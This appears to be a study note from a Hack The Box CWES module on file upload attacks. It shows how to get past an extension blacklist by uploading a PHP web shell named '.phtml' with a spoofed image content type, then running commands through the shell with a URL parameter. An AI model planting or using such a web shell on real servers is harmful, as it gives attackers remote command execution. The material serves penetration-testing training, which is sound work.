---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
section: "Blacklist Filters"
source_file: "CWES.xmind"
---

# Non-Blacklisted Extensions

> [!info] Complete technical reference
> Imported without removing commands, hints, links, notes, or images.

## we may need to try several extensions to get one that successfully executes PHP

### changing the file name to use the .phtml

- Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml"  
  Content-Type: image/png  

  <?<!-- -->php sys<!-- -->tem($_REQUEST['cmd']); ?>  
  ------geckoformboundarya03ae5863944a627a32c1c92bc9b3249--
  - visit our upload
    - http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
